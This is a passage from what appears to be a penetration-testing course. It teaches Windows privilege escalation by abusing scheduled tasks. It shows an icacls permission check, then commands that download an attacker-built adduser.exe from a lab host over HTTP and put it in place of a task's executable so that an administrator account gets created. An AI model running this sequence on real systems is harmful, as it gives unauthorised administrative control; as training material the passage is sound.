# Scheduled Tasks

Windows uses the *Task Scheduler* to execute various automated tasks,
such as clean-up activities or update management. On Windows, they
are called Scheduled Tasks, or *Tasks*, and are defined with one or
more triggers. A trigger is used as a condition, causing one or more
actions to be executed when met. For example, a trigger can be set
to a specific time and date, at startup, at log on, or on a Windows
*event*. An action specifies which program or script to execute. There
are various other possible configurations for a task, categorized
in the *Conditions*, *Settings*, and *General* menu tabs of a task's
property.

For us, three pieces of information are vital to obtain from a
scheduled task to identify possible privilege escalation vectors:

- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?

The first question helps us understand if abusing the task will
eventually lead to privilege escalation. If the task is executed
in the context of our current user, it won't lead us to elevated
privileges. However, if the task runs as *NT AUTHORITY\SYSTEM* or
as an administrative user, then a successful attack could lead us to
privilege escalation.

The second question is important because if the trigger condition
was met in the past, the task will not run again in the future and
therefore, is not a viable target for us. Additionally, if we are
in a week-long penetration test, but the task runs after this time,
we should search for another privilege escalation vector. However,
we would mention this finding in a penetration testing report for a
client.

While the first two questions help us understand if this task is
even an option for a privilege escalation attack, the answer to the
third question determines how we can perform the potential privilege
escalation. In the majority of cases, we can leverage familiar tactics
such as replacing the binary or placing a missing DLL as we did with
services in a previous Learning Unit. While we don't have a service
binary with scheduled tasks, we have programs and scripts specified by
actions.

Since the executable file **BackendCacheCleanup.exe** is located
in a subdirectory of the home directory of *steve*, we should have
extensive permissions on it. Let's check our permissions on this file
with **icacls**.

```
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)

```

As expected, we have Full Access (F) permissions, since the executable
file is in the home directory of *steve*. Now, we can use our binary
**adduser.exe** again to replace the executable file specified in the
action of the scheduled task.

To do so, we'll start a Python3 web server to serve our cross-compiled
file, **adduser.exe**, and use **iwr** to download it to CLIENTWK220.
We'll also copy the original **BackendCacheCleanup.exe** so we can
restore it after our privilege escalation attack is successful.

```
PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe

PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak

PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\

```

> Listing 79 - Download and replace executable file BackendCacheCleanup.exe
> 

Once the scheduled task is executed again, *dave2* should be created
and added to the local *Administrators* group. After waiting a minute,
we can check if our privilege escalation attack was successful.
